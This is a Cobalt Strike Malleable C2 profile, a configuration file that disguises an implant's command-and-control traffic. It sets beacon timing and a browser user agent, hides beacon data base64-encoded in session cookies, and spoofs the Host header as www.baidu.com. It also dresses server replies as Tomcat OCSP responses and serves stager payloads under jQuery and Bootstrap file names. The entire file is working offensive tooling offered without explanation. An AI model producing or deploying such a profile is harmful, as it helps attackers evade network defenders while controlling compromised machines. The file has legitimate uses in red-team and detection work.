set sample_name "CS profile";
set sleeptime "60000";
set jitter    "0";
set maxdns    "255";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0";

http-get {

    set uri "/api/v2/token/1de98f7d151d8233f2840df0ee8c5116";

    client {
        header "Accept" "*/*";
		header "Host" "www.baidu.com";
        metadata {
            base64;
            prepend "SESSIONID=";
            header "Cookie";
        }
    }

    server {
        header "Content-Type" "application/ocsp-response";
        header "content-transfer-encoding" "binary";
        header "Server" "Tomcat";
        output {
            base64;
            print;
        }
    }
}
http-stager {  
    set uri_x86 "/jquery-1.11.3.js";
    set uri_x64 "/bootstrap-2.min.js";
}
http-post {
    set uri "/api/v2/token/1657112092";
    client {
        header "Accept" "*/*";
		header "Host" "www.baidu.com";
        id {
            base64;
            prepend "JSESSION=";
            header "Cookie";
        }
        output {
            base64;
            print;
        }
    }

    server {
        header "Content-Type" "application/ocsp-response";
        header "content-transfer-encoding" "binary";
        header "Connection" "keep-alive";
        output {
            base64;
            print;
        }
    }
}